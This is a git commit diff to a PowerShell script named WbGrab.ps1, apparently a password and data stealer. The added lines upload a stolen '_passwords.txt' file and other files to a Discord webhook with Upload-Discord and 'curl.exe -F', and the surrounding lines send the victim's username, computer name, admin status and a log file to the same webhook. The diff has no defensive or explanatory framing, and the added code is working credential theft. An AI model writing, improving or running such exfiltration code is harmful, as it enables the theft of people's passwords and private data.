8f318505fa4ab600872b13cf5f5a71160b88000c
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-12 17:46:17 +0700

    Update WbGrab.ps1

--- WbGrab.ps1
+++ WbGrab.ps1
@@ -32,7 +32,14 @@ $Body = @{
   'username' = $env:username
   'content' = $text
 }
+if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
+
 curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $hookurl >$null 2>&1
 
 
